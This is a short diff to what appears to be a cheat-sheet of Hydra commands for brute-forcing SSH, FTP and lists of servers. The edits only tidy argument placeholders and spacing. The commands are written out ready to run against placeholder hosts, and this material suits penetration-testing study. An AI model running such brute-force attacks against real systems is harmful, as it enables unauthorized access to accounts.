@@ -81,11 +81,11 @@ exist GUI and CLI mode
 
 :: SSH brute force
 
-# hydra -l <username> -p <wordlist> 10.10.10.1 -t 50  ssh
+# hydra -l <username> -p <password> 10.10.10.1 -t 50  ssh
 
 :: FTP brute force
 
-# hydra -l <username> -p <wordlist> ftp://10.10.10.1
+# hydra -l <username> -p <password> ftp://10.10.10.1
 
 :: HTTP-POST-FORM
 
@@ -100,11 +100,11 @@ message = message to known an incorrect value, refer to the error message after 
 
 ::: brute force list of servers
 
-# hydra -v -l b0ydC -p qwerty -t50 -M /usr/servers.txt ssh
+# hydra -v -l b0ydC -p qwerty -t 50 -M /usr/servers.txt ssh
 
 ::: brute force & use list of passwords
 
-# hydra -v -l b0ydC -P /usr/pass.txt -t50 -M /usr/servers.txt ssh
+# hydra -v -l b0ydC -P /usr/pass.txt -t 50 -M /usr/servers.txt ssh
 
 FLAGS:
 
